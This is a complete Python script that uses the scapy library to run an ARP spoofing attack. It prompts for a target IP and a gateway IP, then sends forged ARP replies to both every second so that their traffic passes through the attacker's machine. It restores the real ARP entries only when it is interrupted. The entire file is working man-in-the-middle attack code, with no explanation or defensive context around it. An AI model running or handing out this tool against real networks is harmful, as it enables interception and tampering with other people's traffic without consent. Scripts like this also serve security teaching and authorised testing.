import scapy.all as scapy
import time

interval = 1  
ip_target = input("Enter the target IP address: ")
ip_gateway = input("Enter the gateway IP address: ")

def spoof(target_ip, spoof_ip):
    packet = scapy.ARP(op=2, pdst=target_ip, psrc=spoof_ip, hwdst=scapy.getmacbyip(target_ip))
    scapy.send(packet, verbose=False)

def restore(destination_ip, source_ip):
    destination_mac = scapy.getmacbyip(destination_ip)
    source_mac = scapy.getmacbyip(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, psrc=source_ip, hwdst=destination_mac, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)

try:
    print("Starting ARP spoofing attack...")
    while True:
        spoof(ip_target, ip_gateway)
        spoof(ip_gateway, ip_target)
        time.sleep(interval)
except KeyboardInterrupt:
    print("Interrupted. Restoring network...")
    restore(ip_target, ip_gateway)
    restore(ip_gateway, ip_target)